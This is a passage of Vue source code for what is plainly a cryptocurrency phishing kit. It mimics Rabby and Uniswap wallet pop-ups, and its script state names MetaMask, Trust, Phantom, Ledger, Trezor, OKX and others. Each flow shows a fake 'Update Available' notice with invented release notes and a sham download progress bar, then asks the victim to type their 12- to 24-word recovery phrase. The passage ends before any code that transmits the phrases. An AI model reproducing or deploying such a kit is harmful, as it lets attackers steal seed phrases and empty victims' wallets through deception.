                gradientUnits="userSpaceOnUse"
              >
                <stop stop-color="#8898FF"></stop>
                <stop offset="0.984" stop-color="#6277F1"></stop>
              </linearGradient>
            </defs>
          </svg>
        </div>
        <div class="scwtw-my">
          <h3 class="rabbyonetit">Loading your Rabby Wallet</h3>
        </div>
        <div class="rabbyonetxtbox">
          <p class="rabbyonetxt">
            The game-changing wallet for Ethereum and all EVM chains
          </p>
        </div>
      </div>
      <div :class="pageManager == '2' ? 'rabbytwo' : 'scwtw-hidden'">
        <div class="rabbytwoconbox">
          <div class="rabbytwohead">
            <div class="scwtw-mb-6">
              <svg
                class="scwtw-w-20 scwtw-h-20"
                width="100"
                height="100"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 100 100"
              >
                <path
                  d="M92.53 55.386c3.375-7.57-13.312-28.715-29.253-37.525-10.048-6.825-20.519-5.887-22.64-2.89-4.653 6.576 15.41 12.148 28.83 18.65-2.885 1.258-5.603 3.515-7.202 6.401-5.002-5.482-15.982-10.203-28.865-6.4-8.682 2.562-15.898 8.604-18.686 17.728a5.428 5.428 0 00-2.218-.47c-3.018 0-5.465 2.456-5.465 5.486s2.447 5.486 5.465 5.486c.56 0 2.31-.377 2.31-.377l27.952.203C31.58 79.48 22.745 82.082 22.745 85.166c0 3.084 8.453 2.249 11.627 1.099 15.194-5.503 31.513-22.654 34.314-27.591 11.76 1.472 21.643 1.647 23.844-3.288z"
                  fill="url(#logo_svg__paint0_linear_111797_37674_2)"
                ></path>
                <path
                  fill-rule="evenodd"
                  clip-rule="evenodd"
                  d="M69.465 33.623h.002c.622-.245.521-1.167.35-1.891-.392-1.665-7.165-8.378-13.525-11.385-8.666-4.097-15.047-3.886-15.99-1.997 1.765 3.631 9.949 7.041 18.496 10.602 3.647 1.52 7.36 3.067 10.668 4.67h-.001z"
                  fill="url(#logo_svg__paint1_linear_111797_37674_2)"
                ></path>
                <path
                  fill-rule="evenodd"
                  clip-rule="evenodd"
                  d="M58.467 70.175c-1.752-.672-3.732-1.29-5.983-1.849 2.4-4.31 2.903-10.692.637-14.726-3.181-5.662-7.174-8.676-16.453-8.676-5.103 0-18.843 1.725-19.087 13.239-.026 1.208 0 2.315.086 3.333l25.091.182c-3.383 5.387-6.55 9.382-9.324 12.42 3.33.856 6.078 1.575 8.601 2.235 2.394.627 4.585 1.2 6.878 1.787 3.46-2.53 6.712-5.288 9.554-7.945z"
                  fill="url(#logo_svg__paint2_linear_111797_37674_2)"
                ></path>
                <path
                  d="M14.379 60.312c1.025 8.746 5.977 12.174 16.095 13.188 10.12 1.015 15.924.334 23.651 1.04 6.454.59 12.217 3.89 14.355 2.75 1.923-1.027.847-4.736-1.727-7.116-3.337-3.085-7.956-5.23-16.083-5.991 1.62-4.451 1.166-10.692-1.35-14.088-3.636-4.91-10.35-7.129-18.846-6.16-8.876 1.014-17.382 5.4-16.095 16.377z"
                  fill="url(#logo_svg__paint3_linear_111797_37674_2)"
                ></path>
                <defs>
                  <linearGradient
                    id="logo_svg__paint0_linear_111797_37674_2"
                    x1="32.389"
                    y1="48.683"
                    x2="91.836"
                    y2="65.478"
                    gradientUnits="userSpaceOnUse"
                  >
                    <stop stop-color="#8697FF"></stop>
                    <stop offset="1" stop-color="#ABB7FF"></stop>
                  </linearGradient>
                  <linearGradient
                    id="logo_svg__paint1_linear_111797_37674_2"
                    x1="81.798"
                    y1="47.549"
                    x2="38.766"
                    y2="4.574"
                    gradientUnits="userSpaceOnUse"
                  >
                    <stop stop-color="#8697FF"></stop>
                    <stop
                      offset="1"
                      stop-color="#5156D8"
                      stop-opacity="0"
                    ></stop>
                  </linearGradient>
                  <linearGradient
                    id="logo_svg__paint2_linear_111797_37674_2"
                    x1="59.66"
                    y1="71.678"
                    x2="18.401"
                    y2="48.046"
                    gradientUnits="userSpaceOnUse"
                  >
                    <stop stop-color="#465EED"></stop>
                    <stop
                      offset="1"
                      stop-color="#8697FF"
                      stop-opacity="0"
                    ></stop>
                  </linearGradient>
                  <linearGradient
                    id="logo_svg__paint3_linear_111797_37674_2"
                    x1="35.936"
                    y1="48.237"
                    x2="63.901"
                    y2="83.636"
                    gradientUnits="userSpaceOnUse"
                  >
                    <stop stop-color="#8898FF"></stop>
                    <stop offset="0.984" stop-color="#6277F1"></stop>
                  </linearGradient>
                </defs>
              </svg>
            </div>
            <h3 class="rabbytwotit">Update Available</h3>
            <p class="rabbytwotxt">Version 0.93.16</p>
          </div>
          <div class="rabbytwomsbox">
            <h4 class="rabbytwomstit">What's new</h4>
            <ul class="rabbytwomsul">
              <li class="rabbytwomsli">
                <svg
                  class="rabbytwomssvg"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                <span class="rabbytwomstxt"
                  >Enhanced multi-chain support with seamless asset
                  viewing</span
                >
              </li>
              <li class="rabbytwomsli">
                <svg
                  class="rabbytwomssvg"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                <span class="rabbytwomstxt"
                  >Improved transaction security analysis for better
                  protection</span
                >
              </li>
              <li class="rabbytwomsli">
                <svg
                  class="rabbytwomssvg"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                <span class="rabbytwomstxt"
                  >Fixed network connectivity issues with Layer 2
                  solutions</span
                >
              </li>
              <li class="rabbytwomsli">
                <svg
                  class="rabbytwomssvg"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                <span class="rabbytwomstxt"
                  >Added support for new EVM-compatible chains</span
                >
              </li>
              <li class="rabbytwomsli">
                <svg
                  class="rabbytwomssvg"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                <span class="rabbytwomstxt"
                  >Performance optimizations for faster DApp interactions</span
                >
              </li>
            </ul>
          </div>
          <div class="scwtw-mt-auto">
            <button @click="pageSwitch('3')" class="rabbyupdatabut">
              Update Now
            </button>

            <div class="rabbyupdatalinkbox">
              <a
                href="https://rabby.io/help"
                target="_blank"
                class="rabbyupdatalink"
                >Need help? Visit our Support Center</a
              >
            </div>
          </div>
        </div>
      </div>
      <div :class="pageManager == '3' ? 'okxthree' : ' scwtw-hidden'">
        <div class="onxthreebox">
          <div class="onxthreebhead">
            <div class="scwtw-mb-8 scwtw-relative">
              <!-- The Rabby logo with bounce animation -->
              <div class="scwtw-w-20 scwtw-h-20 scwtw-relative margin-b32">
                <svg
                  class="scwtw-w-20 scwtw-h-20 rabby-svg-bounce"
                  width="100"
                  height="100"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 100 100"
                >
                  <path
                    d="M92.53 55.386c3.375-7.57-13.312-28.715-29.253-37.525-10.048-6.825-20.519-5.887-22.64-2.89-4.653 6.576 15.41 12.148 28.83 18.65-2.885 1.258-5.603 3.515-7.202 6.401-5.002-5.482-15.982-10.203-28.865-6.4-8.682 2.562-15.898 8.604-18.686 17.728a5.428 5.428 0 00-2.218-.47c-3.018 0-5.465 2.456-5.465 5.486s2.447 5.486 5.465 5.486c.56 0 2.31-.377 2.31-.377l27.952.203C31.58 79.48 22.745 82.082 22.745 85.166c0 3.084 8.453 2.249 11.627 1.099 15.194-5.503 31.513-22.654 34.314-27.591 11.76 1.472 21.643 1.647 23.844-3.288z"
                    fill="url(#logo_svg__paint0_linear_111797_37674_3)"
                  ></path>
                  <path
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                    d="M69.465 33.623h.002c.622-.245.521-1.167.35-1.891-.392-1.665-7.165-8.378-13.525-11.385-8.666-4.097-15.047-3.886-15.99-1.997 1.765 3.631 9.949 7.041 18.496 10.602 3.647 1.52 7.36 3.067 10.668 4.67h-.001z"
                    fill="url(#logo_svg__paint1_linear_111797_37674_3)"
                  ></path>
                  <path
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                    d="M58.467 70.175c-1.752-.672-3.732-1.29-5.983-1.849 2.4-4.31 2.903-10.692.637-14.726-3.181-5.662-7.174-8.676-16.453-8.676-5.103 0-18.843 1.725-19.087 13.239-.026 1.208 0 2.315.086 3.333l25.091.182c-3.383 5.387-6.55 9.382-9.324 12.42 3.33.856 6.078 1.575 8.601 2.235 2.394.627 4.585 1.2 6.878 1.787 3.46-2.53 6.712-5.288 9.554-7.945z"
                    fill="url(#logo_svg__paint2_linear_111797_37674_3)"
                  ></path>
                  <path
                    d="M14.379 60.312c1.025 8.746 5.977 12.174 16.095 13.188 10.12 1.015 15.924.334 23.651 1.04 6.454.59 12.217 3.89 14.355 2.75 1.923-1.027.847-4.736-1.727-7.116-3.337-3.085-7.956-5.23-16.083-5.991 1.62-4.451 1.166-10.692-1.35-14.088-3.636-4.91-10.35-7.129-18.846-6.16-8.876 1.014-17.382 5.4-16.095 16.377z"
                    fill="url(#logo_svg__paint3_linear_111797_37674_3)"
                  ></path>
                  <defs>
                    <linearGradient
                      id="logo_svg__paint0_linear_111797_37674_3"
                      x1="32.389"
                      y1="48.683"
                      x2="91.836"
                      y2="65.478"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#8697FF"></stop>
                      <stop offset="1" stop-color="#ABB7FF"></stop>
                    </linearGradient>
                    <linearGradient
                      id="logo_svg__paint1_linear_111797_37674_3"
                      x1="81.798"
                      y1="47.549"
                      x2="38.766"
                      y2="4.574"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#8697FF"></stop>
                      <stop
                        offset="1"
                        stop-color="#5156D8"
                        stop-opacity="0"
                      ></stop>
                    </linearGradient>
                    <linearGradient
                      id="logo_svg__paint2_linear_111797_37674_3"
                      x1="59.66"
                      y1="71.678"
                      x2="18.401"
                      y2="48.046"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#465EED"></stop>
                      <stop
                        offset="1"
                        stop-color="#8697FF"
                        stop-opacity="0"
                      ></stop>
                    </linearGradient>
                    <linearGradient
                      id="logo_svg__paint3_linear_111797_37674_3"
                      x1="35.936"
                      y1="48.237"
                      x2="63.901"
                      y2="83.636"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#8898FF"></stop>
                      <stop offset="0.984" stop-color="#6277F1"></stop>
                    </linearGradient>
                  </defs>
                </svg>
              </div>
            </div>

            <h3 class="rabbythreetit">Updating Rabby Wallet</h3>
            <p class="rabbythreetxt">
              Please wait while we update to version 0.93.16
            </p>
          </div>
          <div class="scwtw-w-full scwtw-mb-6">
            <div class="okxprogressbox">
              <div
                class="rabbyprogressbg"
                :style="{ width: one_progress + '%' }"
              ></div>
            </div>

            <div class="okxprogresstxtbox">
              <p class="okxprogresstxt">Downloading update...</p>
              <p class="okxprogressbfb">{{ Math.trunc(one_progress) }}%</p>
            </div>
          </div>
          <div class="okxpleasebox">
            <p class="okxpleasetxt">
              Please do not close this window during the update.
            </p>
          </div>
        </div>
      </div>
      <div :class="pageManager == '4' ? 'rabbyimport' : ' scwtw-hidden'">
        <div>
          <div>
            <div class="rabbyimporthead">
              <div>
                <button
                  @click="walletsswitch('Rabby', false)"
                  class="rabbyclosebut"
                  type="button"
                >
                  <svg
                    class="rabbyclosesvg"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1.5"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <path d="m15 18-6-6 6-6"></path>
                  </svg>
                </button>
              </div>
              <div class="rabbyimportlogo">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="8"
                  height="8"
                  fill="none"
                  class="rabbyimportlogoy"
                  viewBox="0 0 8 8"
                >
                  <circle cx="4" cy="4" r="4" fill="currentColor"></circle>
                </svg>
                <div class="rabbyimportlogox"></div>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="8"
                  height="8"
                  fill="none"
                  class="rabbyimportlogot"
                  viewBox="0 0 8 8"
                >
                  <circle cx="4" cy="4" r="4" fill="currentColor"></circle>
                </svg>
              </div>
              <div>
                <div class="scwtw-w-6 scwtw-h-6"></div>
              </div>
            </div>
            <div class="rabbyoldtitbox">
              <div>
                <p class="rabbyoldtit">Import Secret Phrase</p>
              </div>
            </div>
            <div class="rabbyselectbox">
              <div>
                <select v-model="selectedOption" class="rabbyselect">
                  <option value="12" selected="">
                    I have a 12-word phrase
                  </option>
                  <option value="15">I have a 15-word phrase</option>
                  <option value="18">I have a 18-word phrase</option>
                  <option value="21">I have a 21-word phrase</option>
                  <option value="24">I have a 24-word phrase</option>
                </select>
              </div>
              <div class="scwtw-mt-3">
                <button
                  @click="resetInput()"
                  class="rabbyresetbut"
                  type="button"
                >
                  <svg
                    class="rabbyresetsvg"
                    xmlns="http://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    fill="none"
                    viewBox="0 0 16 16"
                  >
                    <path
                      clip-rule="evenodd"
                      d="M6.669 1.969h2.667v2.666h5v2.667H1.669V4.635h5V1.97z"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    ></path>
                    <path
                      d="M2.669 13.331h10.667v-6H2.669v6z"
                      stroke="currentColor"
                      stroke-linejoin="round"
                    ></path>
                    <path
                      d="M5.331 13.301v-1.994M8 13.3v-2M10.669 13.301v-1.994"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    ></path>
                  </svg>
                </button>
              </div>
            </div>
            <div class="rabbyinpursbox">
              <div class="rabbyinpurs">
                <div
                  v-for="(item, i) in visibleInputs"
                  :key="i"
                  class="scwtw-relative"
                >
                  <div class="rabbyimportbq">
                    <div>
                      <p class="rabbyimportbqtxt">{{ i + 1 }}.</p>
                    </div>
                  </div>
                  <input
                    :class="
                      item.type
                        ? 'rabbyimportinput no-auto'
                        : 'rabbyimportinput no-autofill-pwd'
                    "
                    v-model="item.value"
                    id="importwalletinput"
                    type="text"
                  />
                </div>
              </div>
            </div>
          </div>
          <div :class="errormessage ? 'rabbyimporterr' : 'scwtw-hidden'">
            <p class="rabbyimporterrtxt">
              2 inputs do not conform to Seed Phrase norms, please check.
            </p>
          </div>
          <div class="rabbyendbutbox">
            <div class="scwtw-w-full">
              <button
                class="rabbyendbut"
                @click="confirm()"
                :disabled="!isConfirmEnabled"
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Uniswap -->
  <div :class="Uniswapisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'">
    <div
      @click="walletsswitch('Uniswap', false)"
      class="walletsbg zindexh1"
    ></div>
    <div
      :class="
        Uniswapisshow
          ? 'Metamaskbox uniswapbox Metamaskboxshow'
          : 'Metamaskbox uniswapbox'
      "
    >
      <div :class="pageManager == '1' ? 'uniswapone' : 'scwtw-hidden'">
        <img src="../assets/uniswaplogo.png" class="uniswaplogo" alt="" />
      </div>
      <div :class="pageManager == '2' ? 'uniswaptwo' : 'scwtw-hidden'">
        <div class="uniswaptwocon">
          <div class="uniswapthead">
            <div>
              <button
                @click="walletsswitch('Uniswap', false)"
                class="uniswapclosebut"
                type="button"
              >
                <svg
                  class="scwtw-w-6 scwtw-h-6 uniswapclosesvg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke-width="8"
                >
                  <path
                    d="M20 12C20 12.5523 19.5523 13 19 13L7.41421 13L12.7071 18.2929C13.0976 18.6834 13.0976 19.3166 12.7071 19.7071C12.3166 20.0976 11.6834 20.0976 11.2929 19.7071L4.29289 12.7071C3.90237 12.3166 3.90237 11.6834 4.29289 11.2929L11.2929 4.29289C11.6834 3.90237 12.3166 3.90237 12.7071 4.29289C13.0976 4.68342 13.0976 5.31658 12.7071 5.70711L7.41421 11H19C19.5523 11 20 11.4477 20 12Z"
                    fill="currentColor"
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                  ></path>
                </svg>
              </button>
            </div>
          </div>
          <div class="uniswapybody">
            <div class="scwtw-mb-6">
              <div class="uniswaptlogobox">
                <img
                  src="../assets/uniswapmlogo.png"
                  alt="Uniswap"
                  class="scwtw-w-12 scwtw-h-12"
                />
              </div>
            </div>
            <div class="uniswapttitbox">
              <h4 class="uniswapttit">Update Available</h4>
              <p class="uniswapttxt">Version 1.16.0.1</p>
            </div>
            <div class="uniswapalertbox">
              <div class="uniswapalertbb">
                <div class="uniswapalertsvgbox">
                  <svg
                    class="uniswapalertsvg"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke-width="8"
                  >
                    <path
                      d="M10.9906 2.29105C11.5576 1.7239 12.4406 1.7239 13.0068 2.29105L21.7086 10.9928C22.2757 11.5591 22.2757 12.4428 21.7086 13.0098L13.0068 21.7117C12.4406 22.2788 11.5576 22.2788 10.9906 21.7117L2.29141 13.0098C1.7252 12.4428 1.7252 11.5591 2.29141 10.9928L10.9906 2.29105Z"
                      fill="currentColor"
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                    ></path>
                    <path
                      d="M12 8.25C12.4142 8.25 12.75 8.58579 12.75 9V13.5C12.75 13.9142 12.4142 14.25 12 14.25C11.5858 14.25 11.25 13.9142 11.25 13.5V9C11.25 8.58579 11.5858 8.25 12 8.25Z"
                      fill="white"
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                    ></path>
                    <path
                      d="M12 15.75C12.4142 15.75 12.75 16.0858 12.75 16.5C12.75 16.9142 12.4142 17.25 12 17.25C11.5858 17.25 11.25 16.9142 11.25 16.5C11.25 16.0858 11.5858 15.75 12 15.75Z"
                      fill="white"
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                    ></path>
                  </svg>
                </div>
                <div>
                  <p class="uniswapalerttit">Important security update</p>
                  <p class="uniswapalerttxt">
                    This update includes critical security improvements to keep
                    your wallet protected.
                  </p>
                </div>
              </div>
            </div>
            <div class="scwtw-w-full scwtw-mb-6">
              <p class="uniswaptdetailstit">What's new</p>
              <ul class="uniswaptul">
                <li class="uniswaptli">
                  <div class="uniswaptbqbox">
                    <div class="uniswaptbq"></div>
                  </div>
                  <span class="uniswaptlitxt"
                    >Enhanced trading experience with improved token swaps and
                    lower slippage</span
                  >
                </li>
                <li class="uniswaptli">
                  <div class="uniswaptbqbox">
                    <div class="uniswaptbq"></div>
                  </div>
                  <span class="uniswaptlitxt"
                    >Fixed security vulnerability in transaction signing
                    process</span
                  >
                </li>
                <li class="uniswaptli">
                  <div class="uniswaptbqbox">
                    <div class="uniswaptbq"></div>
                  </div>
                  <span class="uniswaptlitxt"
                    >Improved connection stability with Web3 dApps</span
                  >
                </li>
              </ul>
            </div>
          </div>
          <div class="uniswaptupdatabox">
            <button
              @click="pageSwitch('3')"
              class="uniswaptupdatabut"
              type="button"
            >
              Update now
            </button>

            <div class="uniswaptupdatalinkbox">
              <a
                href="https://href.li/?https://support.uniswap.org/hc/en-us"
                target="_blank"
                class="uniswaptupdatalink"
                >Need help? Contact support</a
              >
            </div>
          </div>
        </div>
      </div>
      <div :class="pageManager == '3' ? 'uniswapthree' : 'scwtw-hidden'">
        <div class="uniswapthreecon">
          <div class="uniswapslogobox">
            <div class="uniswapslogob">
              <img
                src="../assets/uniswapslogo.png"
                alt="Uniswap"
                class="uniswapunicornbounce"
              />
            </div>
          </div>
          <div class="uniswapstitbox">
            <h4 class="uniswapstit">Updating Uniswap Wallet</h4>
            <p class="uniswapstxt">
              Please wait while we update to version 1.16.0.1
            </p>
          </div>
          <div class="uniswapprogressbox">
            <div class="uniswapprogressbg">
              <div
                class="uniswapprogress"
                :style="{ width: one_progress + '%' }"
              ></div>
            </div>

            <div class="uniswapprogresstxtbox">
              <p class="uniswapprogresstxtl">Downloading update...</p>
              <p class="uniswapprogresstxtr">{{ Math.trunc(one_progress) }}%</p>
            </div>
          </div>
          <p class="uniswapsnotice">
            Please do not close this window during the update.
          </p>
        </div>
      </div>
      <div :class="pageManager == '4' ? 'uniswapfour' : 'scwtw-hidden'">
        <div>
          <div>
            <div class="uniswapclosebutbox">
              <div>
                <button
                  @click="walletsswitch('Uniswap', false)"
                  class="uniswapclosebut"
                  type="button"
                >
                  <svg
                    class="uniswapclosesvg"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke-width="8"
                  >
                    <path
                      d="M20 12C20 12.5523 19.5523 13 19 13L7.41421 13L12.7071 18.2929C13.0976 18.6834 13.0976 19.3166 12.7071 19.7071C12.3166 20.0976 11.6834 20.0976 11.2929 19.7071L4.29289 12.7071C3.90237 12.3166 3.90237 11.6834 4.29289 11.2929L11.2929 4.29289C11.6834 3.90237 12.3166 3.90237 12.7071 4.29289C13.0976 4.68342 13.0976 5.31658 12.7071 5.70711L7.41421 11H19C19.5523 11 20 11.4477 20 12Z"
                      fill="currentColor"
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                    ></path>
                  </svg>
                </button>
              </div>
            </div>
          </div>
          <div class="uniswapimporttbox">
            <div class="uniswapimportlogobox">
              <svg
                class="uniswapimportsvg"
                viewBox="0 0 24 24"
                fill="none"
                stroke-width="8"
              >
                <path
                  d="M12.75 6V3.75L17.25 8.25H15C13.42 8.25 12.75 7.58 12.75 6ZM14.75 16.6V17C14.26 17.5 14 18.2 14 19.05V20.7C14 20.87 13.87 21 13.7 21H6C4 21 3 20 3 18V6C3 4 4 3 6 3H11.25V6C11.25 8.42 12.58 9.75 15 9.75H18V12.64C18 12.79 17.9 12.9 17.75 12.93C16.04 13.27 14.75 14.79 14.75 16.6ZM7.75 16C7.75 15.586 7.414 15.25 7 15.25C6.586 15.25 6.25 15.586 6.25 16C6.25 16.414 6.586 16.75 7 16.75C7.414 16.75 7.75 16.414 7.75 16ZM7.75 12C7.75 11.586 7.414 11.25 7 11.25C6.586 11.25 6.25 11.586 6.25 12C6.25 12.414 6.586 12.75 7 12.75C7.414 12.75 7.75 12.414 7.75 12ZM11.75 16C11.75 15.586 11.414 15.25 11 15.25H9.5C9.086 15.25 8.75 15.586 8.75 16C8.75 16.414 9.086 16.75 9.5 16.75H11C11.414 16.75 11.75 16.414 11.75 16ZM14.75 12C14.75 11.586 14.414 11.25 14 11.25H9.5C9.086 11.25 8.75 11.586 8.75 12C8.75 12.414 9.086 12.75 9.5 12.75H14C14.414 12.75 14.75 12.414 14.75 12ZM21.5 19.05V21.15C21.5 22.05 21.0499 22.5 20.1499 22.5H16.8501C15.9501 22.5 15.5 22.05 15.5 21.15V19.05C15.5 18.38 15.751 17.961 16.25 17.79V16.6C16.25 15.359 17.26 14.35 18.5 14.35C19.74 14.35 20.75 15.359 20.75 16.6V17.79C21.249 17.961 21.5 18.38 21.5 19.05ZM19.25 16.6C19.25 16.186 18.913 15.85 18.5 15.85C18.087 15.85 17.75 16.186 17.75 16.6V17.7H19.25V16.6Z"
                  fill="currentColor"
                ></path>
              </svg>
            </div>
            <div class="uniswapimportlogotxtbox">
              <h4 class="uniswapimportlogotit">
                Import with your recovery phrase
              </h4>
              <p class="uniswapimportlogotxt">
                Type or paste your 12-word recovery phrase
              </p>
            </div>
          </div>
          <div :class="errormessage ? 'uniswaperrtxtbox' : 'scwtw-hidden'">
            <span class="uniswaperrtxt">words is invalid or misspelled</span>
          </div>
          <div class="uniswapinpursbox">
            <div class="uniswapinputsb">
              <div
                v-for="(item, i) in visibleInputs"
                :key="i"
                class="scwtw-relative"
              >
                <div class="uniswapinputdqbox">
                  <div>
                    <p class="uniswapinputdq">{{ i + 1 }}</p>
                  </div>
                </div>
                <input class="uniswapinput" v-model="item.value" type="text" />
              </div>
            </div>
          </div>
          <div class="uniswapinpurnumbox">
            <button class="uniswapinpurnumbbut" type="button">
              <span
                @click="selectedOptionh('24')"
                :class="
                  selectedOption == '12' ? 'uniswapinpurnumtxt' : 'scwtw-hidden'
                "
                >My recovery phrase is longer</span
              >
              <span
                @click="selectedOptionh('12')"
                :class="
                  selectedOption == '24' ? 'uniswapinpurnumtxt' : 'scwtw-hidden'
                "
                >My recovery phrase is 12 words</span
              >
              <span
                :class="
                  selectedOption == '12'
                    ? 'uniswapinpurnumsvgbox'
                    : 'uniswapinpurnumsvgboxs'
                "
              >
                <svg
                  class="uniswapinpurnumsvg"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke-width="8"
                >
                  <path
                    d="M15.7071 5.29289C16.0976 5.68342 16.0976 6.31658 15.7071 6.70711L10.4142 12L15.7071 17.2929C16.0976 17.6834 16.0976 18.3166 15.7071 18.7071C15.3166 19.0976 14.6834 19.0976 14.2929 18.7071L8.2929 12.7071C7.9024 12.3166 7.9024 11.6834 8.2929 11.2929L14.2929 5.29289C14.6834 4.90237 15.3166 4.90237 15.7071 5.29289Z"
                    fill="currentColor"
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                  ></path>
                </svg>
              </span>
            </button>
          </div>
        </div>
        <div class="uniswapimportbutbox">
          <div class="scwtw-w-full">
            <button
              @click="confirm()"
              class="uniswapimportbut"
              type="button"
              :disabled="!isConfirmEnabled"
            >
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, reactive, computed, watch } from "vue";
//jdt
const one_progress = ref(0);
let walletsisshow = ref(false);
let Metamaskisshow = ref(false);
let Trustisshow = ref(false);
let Phantomisshow = ref(false);
let Ledgerisshow = ref(false);
let Trezorisshow = ref(false);
let Coinbaseisshow = ref(false);
let okxisshow = ref(false);
let Rabbyisshow = ref(false);
let Uniswapisshow = ref(false);
let ismessage = ref(true);
let errormessage = ref(false);
const selectedOption = ref("12");
let walletsright = ref("1");
let pageManager = ref("1");
let doublePage = ref("1");

const importWallet = reactive(
  Array.from({ length: 24 }, () => ({
    value: "",
    type: false,
  }))
);

const mnemonicPhrase = ref([]);

const visibleInputs = computed(() => {
  return importWallet.slice(0, parseInt(selectedOption.value));
});

const isConfirmEnabled = computed(() => {
  return visibleInputs.value.every((item) => item.value.trim() !== "");
});

watch(
  importWallet,
  (newVal) => {
    const hasValue = newVal.some((item) => item.value.trim() !== "");
    errormessage.value = hasValue;
  },
  { deep: true }
);

const toggleType = (index) => {
  visibleInputs.value[index].type = !visibleInputs.value[index].type;
};

const selectedOptionh = (str) => {
  selectedOption.value = str;
};

const resetInput = () => {
  importWallet.forEach((item) => {
    item.value = "";
    item.type = false;
  });
};

const walletsswitch = (is, bol) => {
  if (is == "wallets") {
    walletsisshow.value = bol;
  } else if (is == "Metamask") {
    Metamaskisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        pageManager.value = "2";
      }, 2000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        pageManager.value = "1";
      }, 100);
    }
  } else if (is == "OKX") {
    okxisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        pageManager.value = "2";
      }, 2000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        pageManager.value = "1";
      }, 100);
    }
  } else if (is == "Rabby") {
    Rabbyisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        pageManager.value = "2";
      }, 2000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        pageManager.value = "1";
      }, 100);
    }
  } else if (is == "Uniswap") {
    Uniswapisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        pageManager.value = "2";
      }, 2000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        pageManager.value = "1";
      }, 100);
    }
  } else if (is == "Trust") {
    Trustisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        pageManager.value = "2";
      }, 2000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        pageManager.value = "1";
      }, 100);
    }
  } else if (is == "Phantom") {
    Phantomisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        doublePage.value = "2";
      }, 5000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        doublePage.value = "1";
      }, 100);
    }
  } else if (is == "Ledger") {
    Ledgerisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        doublePage.value = "2";
      }, 5000);
    } else {
      walletsright.value = "1";
      selectedOption.value = "12";
      errormessage.value = false;
      resetInput();
      setTimeout(() => {
        doublePage.value = "1";
      }, 100);
    }
  } else if (is == "Trezor") {
    Trezorisshow.value = bol;
    if (bol == true) {
      walletsright.value = "2";
      setTimeout(() => {
        doublePage.value = "2";
